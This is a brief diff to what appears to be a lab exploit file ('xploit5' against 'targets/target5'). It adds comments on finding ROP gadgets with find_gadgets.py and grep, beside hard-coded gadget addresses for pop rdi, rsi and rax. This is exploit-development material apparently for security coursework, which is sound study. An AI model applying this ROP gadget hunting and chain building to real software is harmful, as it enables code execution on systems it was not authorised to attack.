@@ -7,6 +7,8 @@
 #define DEFAULT_OUTPUT "/tmp/xploit5_output"
 
 // Find the following gadget addr by using find_gadgets.py
+// ./find_gadgets.py targets/target5 > gadgets.txt
+// cat gadgets.txt | grep “pop %rdi”
 #define POP_RDI_RET_ADDR 0x4d74e0
 #define POP_RSI_RET_ADDR 0x4d5148
 #define POP_RAX_RET_ADDR 0x4d84d1
